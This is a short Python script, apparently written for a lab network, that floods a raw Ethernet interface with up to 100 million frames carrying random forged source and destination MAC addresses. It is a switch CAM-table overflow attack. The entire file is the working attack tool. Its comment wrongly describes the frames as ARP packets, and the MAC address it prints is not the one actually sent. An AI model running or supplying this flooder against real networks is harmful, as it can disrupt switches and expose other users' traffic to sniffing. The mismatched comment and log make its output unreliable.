from socket import socket, AF_PACKET, SOCK_RAW

from impacket import ImpactPacket
from impacket import ImpactDecoder
from impacket.ImpactPacket import TCPOption
from time import sleep

import random
#
def randomMAC():
    mac = ( 
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) )
    return mac

#Generate arp packets with randomly 
#s = socket(AF_INET, SOCK_RAW)
s = socket(AF_PACKET, SOCK_RAW)
s.bind(("eve-eth0", 0))

pktid = 0;
while(pktid <= 100000000):
    eth = ImpactPacket.Ethernet()
    forged_mac = randomMAC()
    eth.set_ether_shost(randomMAC())
    eth.set_ether_dhost(randomMAC())
    print "send packet #", pktid,"with src_mac:", ':'.join(map(lambda x: "%02x" % x, forged_mac))
    s.send(eth.get_packet())
    pktid = pktid + 1
    sleep(0.001)
